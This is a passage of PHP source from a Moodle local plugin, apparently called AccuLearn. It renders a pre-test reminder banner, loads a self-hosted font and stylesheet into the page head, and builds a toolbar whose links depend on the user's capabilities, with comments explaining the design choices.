    // Staff don't need this - they're the ones who enter the results.
    if (has_capability('local/acculearnfeedback:reviewaioutput', context_system::instance())) {
        return '';
    }

    // Never interrupt an in-progress assessment or lesson. A banner appearing
    // mid-quiz is a distraction during the exact activity being measured.
    $suppress = ['mod-quiz-attempt', 'mod-quiz-summary', 'mod-quiz-review', 'mod-scorm-player'];
    if (in_array($PAGE->pagetype, $suppress, true)) {
        return '';
    }

    if (!local_acculearnfeedback_needs_pretest($USER->id)) {
        return '';
    }

    $trackurl = $CFG->wwwroot . '/local/acculearnfeedback/my_track.php';

    return '
        <div class="al-card al-card--accent" style="margin:16px auto; max-width:1100px;">
            <div style="display:flex; align-items:flex-start; gap:12px; flex-wrap:wrap;">
                <i class="fa fa-clipboard-list" aria-hidden="true" style="font-size:1.4em; opacity:0.85;"></i>
                <div style="flex:1; min-width:260px;">
                    <strong>Your pre-test hasn\'t been recorded yet.</strong>
                    <div style="color:var(--al-ink-500); margin-top:4px;">
                        AccuLearn builds your personalised learning path from your pre-test answers and how
                        confident you were in each one. Until your teacher enters your results, your path
                        can\'t be worked out yet. Ask your teacher about taking the FABM 1 pre-test if you
                        haven\'t sat it.
                    </div>
                    <a href="' . $trackurl . '" class="al-btn al-btn-sm" style="margin-top:10px; display:inline-block;">
                        Check my learning track
                    </a>
                </div>
            </div>
        </div>
    ';
}

/**
 * Injects the Inter webfont and the AccuLearn stylesheets into <head> on
 * every page, including the pre-login screens (login, forgot password) -
 * unlike the toolbar below (before_footer), which only makes sense once a
 * user is signed in. Branding/colors should still apply before that point,
 * since the login page is the first thing anyone sees.
 *
 * Moodle 5.0's core_renderer::standard_head_html() looks up this legacy
 * callback by the exact name "before_standard_html_head" (see
 * core\hook\output\before_standard_head_html_generation::process_legacy_callbacks(),
 * which calls get_plugins_with_function('before_standard_html_head', ...)) -
 * an earlier version of this file used "before_standardhtmlhead" (missing
 * underscores), which Moodle silently never found or called. Confirmed via
 * the real callsite in core_renderer.php, not guessed.
 */
function local_acculearnfeedback_before_standard_html_head() {
    // styles.css is served straight off disk, not through Moodle's CSS cache,
    // so nothing was busting the browser cache for it - a deployed style
    // change could sit invisible behind a cached copy until a hard reload.
    // The plugin version is a value that only moves when the plugin is
    // upgraded, which is exactly when the file may have changed.
    $cssurl = new moodle_url('/local/acculearnfeedback/styles.css',
        ['v' => get_config('local_acculearnfeedback', 'version')]);

    // tailwind-utilities.css used to be loaded here as well. It was a 24KB
    // minified Tailwind build left over from the archived Laravel/React
    // prototype, served as a render-blocking request on EVERY page of the
    // site, for every user - and not one Tailwind class (flex, px-4, bg-white,
    // text-sm ...) appears in any of this plugin's PHP. The current pages are
    // built entirely from the al-* classes in styles.css plus inline styles.
    // Removing the <link> costs nothing visually and saves the request.
    // The three fonts.googleapis.com / fonts.gstatic.com <link>s that used to
    // be here are gone: Inter is now self-hosted via @font-face in styles.css.
    // They were a render-blocking third-party dependency on every page, which
    // stalls text on a school network that blocks or throttles Google and sent
    // every page view to a third party. Preloading the font here (rather than
    // waiting for the CSS to be parsed and the @font-face matched) keeps the
    // swap-in as early as it was with the external stylesheet.
    $fonturl = new moodle_url('/local/acculearnfeedback/fonts/inter-var.woff2');
    return '
        <link rel="preload" as="font" type="font/woff2" crossorigin href="' . $fonturl->out() . '">
        <link rel="stylesheet" href="' . $cssurl->out() . '">
    ';
}

/**
 * Renders the AccuLearn toolbar on every page for logged-in users.
 * Uses before_footer since Boost's extend_navigation placement is
 * inconsistent across Moodle versions - this guarantees visibility.
 */
function local_acculearnfeedback_before_footer() {
    global $CFG;

    if (!isloggedin() || isguestuser()) {
        return '';
    }

    $context = context_system::instance();
    $canreview = has_capability('local/acculearnfeedback:reviewaioutput', $context);
    $canviewlogs = has_capability('local/acculearnfeedback:viewusagelogs', $context);
    $canmanagesequence = has_capability('local/acculearnfeedback:managesequence', $context);
    $canviewowntrack = has_capability('local/acculearnfeedback:viewowntrack', $context);

    $items = [];

    // Teachers do not get the student-facing track view - see db/access.php
    // for why this hangs off a capability rather than a role name check.
    if ($canviewowntrack) {
        $items[] = [
            'url' => $CFG->wwwroot . '/local/acculearnfeedback/my_track.php',
            'icon' => 'fa-route',
            'label' => 'My Learning Track',
        ];
    }

    if ($canreview) {
        $items[] = [
            'url' => $CFG->wwwroot . '/local/acculearnfeedback/teacher_review.php',
            'icon' => 'fa-clipboard-check',
            'label' => 'AI Output Review',
        ];
    }

    if ($canviewlogs) {
        $items[] = [
            'url' => $CFG->wwwroot . '/local/acculearnfeedback/usage_logs.php',
            'icon' => 'fa-chart-line',
            'label' => 'Usage Logs',
        ];
    }

    if ($canmanagesequence) {
        $items[] = [
            'url' => $CFG->wwwroot . '/local/acculearnfeedback/pretest_entry.php',
            'icon' => 'fa-pencil',
            'label' => 'Pre/Post-Test Entry',
        ];
        $items[] = [
            'url' => $CFG->wwwroot . '/local/acculearnfeedback/tagquestions.php',
            'icon' => 'fa-tags',
            'label' => 'Tag Questions',
        ];
        $items[] = [
            'url' => $CFG->wwwroot . '/local/acculearnfeedback/admin_sequence.php',
            'icon' => 'fa-sliders-h',
            'label' => 'Sequence Settings',
        ];
        $items[] = [
            'url' => $CFG->wwwroot . '/local/acculearnfeedback/data_retention.php',
            'icon' => 'fa-trash-can',
            'label' => 'Data Retention',
        ];
    }

    // Raw table browser - site administrators only, since it shows unfiltered rows.
    if (has_capability('moodle/site:config', $context)) {
        $items[] = [
            'url' => $CFG->wwwroot . '/local/acculearnfeedback/db_browser.php',
            'icon' => 'fa-database',
            'label' => 'Database',
        ];
    }

    // Instructions. Last in the list and shown to everyone - the page picks the
    // right section from the reader's own capabilities.
    $items[] = [
        'url' => $CFG->wwwroot . '/local/acculearnfeedback/help.php',
        'icon' => 'fa-circle-question',
        'label' => 'Help',
    ];

    // Third-party attribution. Shown to everyone for the same reason as Help:
    // the open-source licences the lesson content and interface depend on all
    // require attribution, and a notice only staff can reach does not give it.
    $items[] = [
        'url' => $CFG->wwwroot . '/local/acculearnfeedback/attribution.php',
        'icon' => 'fa-scale-balanced',
        'label' => 'Credits',
    ];

    $itemshtml = '';
    foreach ($items as $item) {
        $itemshtml .= '
            <a href="' . $item['url'] . '" class="al-toolbar__link">
                <i class="fa ' . $item['icon'] . '" style="font-size:1em; opacity:0.85;"></i>
                <span>' . $item['label'] . '</span>
            </a>';
    }

    echo local_acculearnfeedback_pretest_notice();

    // Brand mark. This uses the white version of the logo shipped with the
    // plugin rather than $OUTPUT->get_compact_logo_url(), and that is deliberate:
    // the site logo is dark navy, and this toolbar is a dark blue gradient, so
    // the configured logo would either disappear into the background or need a
    // white chip behind it that does not match anything else in the bar. The
    // light variant sits directly on the gradient and reads cleanly.
    //
    // The trade-off is that replacing the site logo in Appearance does not
    // change this mark - swap pix/logo-mark-light.png as well. See
    // docs/brand/README.md.
    global $OUTPUT;
    $markhtml = '
                <span class="al-toolbar__mark al-toolbar__mark--img">
                    <img src="' . s($OUTPUT->image_url('logo-mark-light', 'local_acculearnfeedback')->out(false)) . '"
                         alt="" aria-hidden="true">
                </span>';

    echo '
        <div class="al-toolbar">
            <div class="al-toolbar__brand">' . $markhtml . '
                AccuLearn
            </div>
            ' . $itemshtml . '
        </div>
        <div class="al-toolbar-spacer"></div>
    ';
}
